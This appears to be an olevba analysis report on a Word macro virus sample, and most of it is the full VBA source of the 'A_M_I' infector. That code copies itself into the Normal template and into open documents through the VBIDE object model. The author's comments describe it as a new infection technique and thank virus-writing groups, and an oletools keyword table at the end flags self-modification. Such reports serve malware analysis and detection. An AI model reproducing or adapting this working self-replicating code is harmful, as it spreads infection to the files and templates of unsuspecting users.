olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Ami-2c4d8c627e910e1427aeffa3479118f39762a09d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Ami-2c4d8c627e910e1427aeffa3479118f39762a09d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub t()

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    MsgBox ActiveDocument.VBProject.VBComponents(I).Name
Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO A_M_I.bas 
in file: Virus.MSWord.Intended.Ami-2c4d8c627e910e1427aeffa3479118f39762a09d - OLE stream: 'Macros/VBA/A_M_I'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Normal_ As Object, Active_ As Object

Sub Add_Modul_Infection()
On Error Resume Next

Set Normal_ = NormalTemplate.VBProject
Set Active_ = ActiveDocument.VBProject

Const ModulName_ = "A_M_I"

NormalIns_ = False
ActiveIns_ = False

CheckRefNormal_
CheckRefActive_

NormalComp_ = Normal_.VBComponents.Count
ActiveComp_ = Active_.VBComponents.Count


For x = 1 To NormalComp_
    If Normal_.VBComponents(x).Name = ModulName_ Then _
    NormalIns_ = True
Next

For y = 1 To ActiveComp_
    If Active_.VBComponents(y).Name = ModulName_ Then _
    ActiveIns_ = True
Next


If NormalIns_ = False Then
  
    VirusLength_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines
    VirusCode_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)
 
    Normal_.VBComponents.Add (vbext_ct_StdModule)
    Normal_.VBComponents((NormalComp_ + 1)).Name = ModulName_
    Normal_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_
        
End If

If ActiveIns_ = False Then

    VirusLength_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines
    VirusCode_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)
    
    Active_.VBComponents.Add (vbext_ct_StdModule)
    Active_.VBComponents((ActiveComp_ + 1)).Name = ModulName_
    Active_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_

End If

End Sub

Function CheckRefNormal_()
CheckRefNormal_ = False

For I = 1 To Normal_.References.Count
    If Normal_.References(I).Name = "VBIDE" Then CheckRefNormal_ = True
Next

If CheckRefNormal_ = False Then
    Normal_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive_()
CheckRefActive_ = False

For I = 1 To Active_.References.Count
    If Active_.References(I).Name = "VBIDE" Then CheckRefActive_ = True
Next

If CheckRefActive_ = False Then
    Active_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'  Jack Twoflower presents: AddModulInfection
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'  This is a new technic to infect moduls
'  without import/export.

'  The code to add the 'VBIDE' library was
'  very hard work, cause I didn't find any
'  information in books, so I tried and
'  tried. How you see, I had success! ;)

' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'  I like to thank to following ppl:
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   
'  ~~+ LineZerØ Network (sorry, but you will
'                        stand strong with-
'                        out me ;( )

'  ~~+ Clau[UC] for helping me in irc and
'               testing this here. ;)

'  ~~+ VicodinES for being to greatest!
                
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'Thnx a lot
'Jack Twoflower

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

